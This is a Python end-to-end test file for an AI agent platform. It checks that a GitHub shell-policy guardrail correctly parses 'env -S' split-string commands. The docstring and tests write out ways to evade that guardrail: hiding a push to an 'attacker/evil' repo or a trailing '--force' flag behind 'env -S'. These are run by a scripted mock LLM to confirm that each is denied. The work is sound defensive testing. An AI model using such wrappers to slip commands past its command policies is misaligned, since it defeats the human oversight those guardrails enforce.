"""E2E: shell policies gate the full ``env -S`` split-string invocation.

coreutils ``env -S '<words>'`` splits the string into words and prepends
them to the remaining argv, so ``env -S 'git' push <url> main`` runs
``git push <url> main``. The shell-policy parser must therefore evaluate
the split words plus the trailing operands as one invocation. A parser
that inspects only the split string drops everything after it, and the
GitHub guardrail then:

- abstains on ``env -S 'git' push <evil-url> main`` — the push to a
  non-allowlisted repo executes instead of being denied;
- ASKs on ``env -S 'git push' <allowed-url> main`` — the destination is
  lost, so an allowlisted push parks on a needless approval card;
- allows ``env -S 'git push <allowed-url> main' --force`` — the trailing
  force flag is lost, bypassing the force-push denial.

Each test drives the real user journey on the SPA: a deterministic
mock-LLM agent carrying a ``github_policy`` guardrail runs one gated
``sys_os_shell`` command; the test sends the triggering chat message and
asserts the user-visible outcome (approval card or none) plus the
persisted tool output (the policy's deny reason vs. the executed
command's output).
"""

from __future__ import annotations

import json
import shutil
import tempfile
import uuid
from collections.abc import Iterator
from contextlib import contextmanager
from pathlib import Path

import httpx
import pytest
from playwright.sync_api import Page, expect
from playwright.sync_api import TimeoutError as PlaywrightTimeoutError

from tests.e2e_ui.conftest import (
    _create_bundled_session,
    configure_mock_llm,
    set_fallback_mock_llm,
)

_COMPOSER = "Send a message…"
_ASSISTANT = '[data-testid="message-bubble"][data-role="assistant"]'
_APPROVAL_CARD = '[data-testid="approval-card"]'

_REPLY = "Shell command finished."
_ALLOWED_URL = "https://github.com/octo/hello"
_EVIL_URL = "https://github.com/attacker/evil"

# Stable fragments of the github_policy deny reasons the fixed parser must
# surface as the gated tool call's output.
_REPO_DENY_SENTINEL = "Write is restricted to the configured repos"
_FORCE_DENY_SENTINEL = "Force push is blocked by policy"

_TURN_TIMEOUT_MS = 120_000

_AGENT_YAML = """\
spec_version: 1
name: {name}
prompt: |
  You are a deterministic policy-test assistant. When the user asks you
  to run the command, you call sys_os_shell exactly once and then reply
  with one short sentence.

executor:
  model: {model}
  config:
    harness: openai-agents

os_env:
  type: caller_process
  cwd: {cwd}
  sandbox:
    type: none

guardrails:
  # Generous window: a parked ASK must outlive the UI assertions.
  ask_timeout: 300
  policies:
    github_guard:
      type: function
      function:
        path: omnigent.policies.builtins.github.github_policy
        arguments:
          write_repos: ["octo/hello"]
          write_branches: ["main"]
"""


@contextmanager
def _gated_session(base_url: str, runner_id: str, mock_url: str, command: str) -> Iterator[str]:
    """A runner-bound session whose mock-LLM turn runs one gated command.

    :param base_url: Spawned server base URL.
    :param runner_id: Token-bound id of the spawned runner.
    :param mock_url: Mock LLM server URL.
    :param command: The exact ``sys_os_shell`` command the turn issues.
    :returns: Yields the session id; deletes the session on exit.
    """
    # A fresh non-git cwd: if the policy fails to gate the push, git exits
    # immediately with "not a git repository" and never touches the network.
    workspace = Path(tempfile.mkdtemp(prefix="omnigent-e2e-envsplit-"))
    name = f"env_split_probe_{uuid.uuid4().hex[:8]}"
    model = f"env-split-probe-{uuid.uuid4().hex[:8]}"

    configure_mock_llm(
        mock_url,
        [
            {
                "tool_calls": [
                    {
                        "call_id": "call_env_split",
                        "name": "sys_os_shell",
                        "arguments": json.dumps({"command": command}),
                    }
                ]
            }
        ],
        key=model,
    )
    set_fallback_mock_llm(mock_url, model, _REPLY)

    yaml_text = _AGENT_YAML.format(name=name, model=model, cwd=str(workspace))
    session_id = _create_bundled_session(base_url, runner_id, yaml_text)
    try:
        yield session_id
    finally:
        httpx.delete(f"{base_url}/v1/sessions/{session_id}", timeout=10.0)
        shutil.rmtree(workspace, ignore_errors=True)


def _send(page: Page, text: str) -> None:
    """Type *text* into the composer and click Send."""
    composer = page.get_by_placeholder(_COMPOSER)
    expect(composer).to_be_visible(timeout=30_000)
    composer.fill(text)
    page.get_by_role("button", name="Send", exact=True).click()


def _run_gated_turn(page: Page, base_url: str, session_id: str) -> None:
    """Send the triggering turn and require it to settle without any approval.

    Waits until either the wrap-up reply or a pending approval card shows,
    then asserts no approval card ever appeared and the reply landed.
    """
    page.goto(f"{base_url}/c/{session_id}")
    _send(page, "Run the command now.")

    reply = page.locator(_ASSISTANT, has_text=_REPLY).first
    card = page.locator(f'{_APPROVAL_CARD}[data-state="pending"]').first
    expect(reply.or_(card).first).to_be_visible(timeout=_TURN_TIMEOUT_MS)
    expect(page.locator(_APPROVAL_CARD)).to_have_count(0)
    expect(reply).to_be_visible()


def _reveal_shell_output(page: Page) -> None:
    """Best-effort: open the Worked fold so a recording shows the tool outcome."""
    try:
        worked = page.get_by_test_id("turn-worked-fold")
        worked.locator('[data-slot="collapsible-trigger"]').first.click(timeout=5_000)
        page.get_by_text("Ran 1 shell command", exact=True).click(timeout=5_000)
        page.locator('[data-slot="collapsible-trigger"]', has_text="env -S").first.click(
            timeout=5_000
        )
        page.wait_for_timeout(1_500)
    except PlaywrightTimeoutError:
        pass


def _tool_outputs(base_url: str, session_id: str) -> list[str]:
    """Return every persisted ``function_call_output`` payload of the session."""
    resp = httpx.get(f"{base_url}/v1/sessions/{session_id}/items?limit=200", timeout=10.0)
    resp.raise_for_status()
    outputs: list[str] = []
    for item in resp.json()["data"]:
        if item.get("type") != "function_call_output":
            continue
        data = item.get("data") or {}
        outputs.append(str(item.get("output") or data.get("output") or ""))
    return outputs


@pytest.mark.timeout(300)
def test_env_split_push_to_unlisted_repo_is_denied(
    page: Page,
    live_server: str,
    runner_id: str,
    mock_llm_server_url: str,
) -> None:
    """`env -S 'git' push <evil> main` must be denied, not silently executed."""
    command = f"env -S 'git' push {_EVIL_URL} main"
    with _gated_session(live_server, runner_id, mock_llm_server_url, command) as session_id:
        _run_gated_turn(page, live_server, session_id)
        _reveal_shell_output(page)

        outputs = _tool_outputs(live_server, session_id)
        assert any(_REPO_DENY_SENTINEL in output for output in outputs), (
            f"push to a non-allowlisted repo was not denied; tool outputs: {outputs!r}"
        )


@pytest.mark.timeout(300)
def test_env_split_allowed_push_needs_no_approval(
    page: Page,
    live_server: str,
    runner_id: str,
    mock_llm_server_url: str,
) -> None:
    """`env -S 'git push' <allowed> main` runs without an approval card."""
    command = f"env -S 'git push' {_ALLOWED_URL} main"
    with _gated_session(live_server, runner_id, mock_llm_server_url, command) as session_id:
        _run_gated_turn(page, live_server, session_id)
        _reveal_shell_output(page)

        outputs = _tool_outputs(live_server, session_id)
        assert outputs, "the allowed push never produced a tool output"
        assert not any(_REPO_DENY_SENTINEL in output for output in outputs), (
            f"allowed push was denied; tool outputs: {outputs!r}"
        )
        snapshot = httpx.get(f"{live_server}/v1/sessions/{session_id}", timeout=10.0)
        snapshot.raise_for_status()
        assert not (snapshot.json().get("pending_elicitations") or []), (
            "allowed push left a parked approval prompt"
        )


@pytest.mark.timeout(300)
def test_env_split_trailing_force_flag_is_denied(
    page: Page,
    live_server: str,
    runner_id: str,
    mock_llm_server_url: str,
) -> None:
    """`env -S 'git push <allowed> main' --force` must hit the force-push deny."""
    command = f"env -S 'git push {_ALLOWED_URL} main' --force"
    with _gated_session(live_server, runner_id, mock_llm_server_url, command) as session_id:
        _run_gated_turn(page, live_server, session_id)
        _reveal_shell_output(page)

        outputs = _tool_outputs(live_server, session_id)
        assert any(_FORCE_DENY_SENTINEL in output for output in outputs), (
            f"force push was not denied; tool outputs: {outputs!r}"
        )
